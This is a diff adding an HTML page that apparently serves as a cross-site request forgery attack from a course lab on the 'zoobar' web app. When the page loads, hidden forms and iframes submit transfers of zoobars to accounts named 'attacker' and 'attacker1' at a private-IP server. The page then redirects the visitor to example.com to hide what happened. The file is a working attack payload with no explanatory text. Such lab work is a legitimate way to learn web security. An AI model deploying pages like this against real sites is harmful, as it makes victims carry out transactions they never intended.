@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    </head>
+    <body>
+      <div id="main" class="centerpiece">
+        <table>
+          <tr><td>
+             <p>
+               
+             </p>
+          </td></tr>
+          <tr><td class="main">
+            
+<form method="POST" id="transferform" style="visibility: hidden" target="frame1" action="http://172.27.21.91:8080/zoobar/index.cgi/transfer">
+<p>Send <input name="zoobars" id='zoobars' type="text" value="1" size=5> zoobars</p>
+<p>to <input name=recipient id='recipient' type=text value="attacker" size=10></p>
+</form>
+          </td></tr>
+        </table>
+      </div>
+      
+      <iframe style="visibility:hidden" id="frame1" name="frame1"></iframe>
+      <iframe style="visibility: hidden" id="frame2" name="frame2"></iframe>
+    </body>
+    <script type="text/javascript">
+    
+    function func1(){
+      document.getElementById('zoobars').value='1';
+      document.getElementById('recipient').value='attacker';
+      document.getElementById('transferform').target='frame1';
+      document.getElementById('transferform').submit();
+    }
+    function func2(){
+      document.getElementById('zoobars').value='9';
+      document.getElementById('recipient').value='attacker1';
+      document.getElementById('transferform').target='frame2';
+      document.getElementById('transferform').submit();
+      
+         }
+
+    func1();
+    setTimeout(function(){
+      func2()
+    }, 100);
+
+document.getElementById('frame2').onload = function () {
+            parent.location.href = "https://www.example.com";
+        }
+</script>
+</html>
